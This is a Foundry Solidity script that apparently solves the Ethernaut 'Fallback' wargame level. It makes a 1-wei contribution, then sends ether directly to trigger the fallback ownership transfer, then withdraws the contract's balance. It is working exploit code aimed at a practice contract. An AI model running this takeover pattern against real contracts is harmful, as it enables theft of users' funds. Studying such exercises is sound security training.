// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/levels/Fallback.sol";

contract FallbackScript is Script {
    Fallback public instance = Fallback(payable(0x4121aDb0C91Ff064ebae25Ba0BC7dF99c8B56047));

    function run() external {
        vm.startBroadcast();
        console.log("Old owner:", instance.owner());
        console.log("Instance start balance:", address(instance).balance);
        uint256 amount = 1 wei;
        instance.contribute{value: amount}();
        console.log("Contribution value:", amount);
        (bool success,) = address(instance).call{value: amount}("");
        require(success, "Failed to send 1 wei to the instance");
        console.log("Value sent to the instance:", amount);
        console.log("Instance current balance:", address(instance).balance);
        instance.withdraw();
        console.log("Instance balance withdrawn and owner transfered!");
        console.log("New owner:", instance.owner());
        console.log("Instance balance:", address(instance).balance);
        vm.stopBroadcast();
    }
}
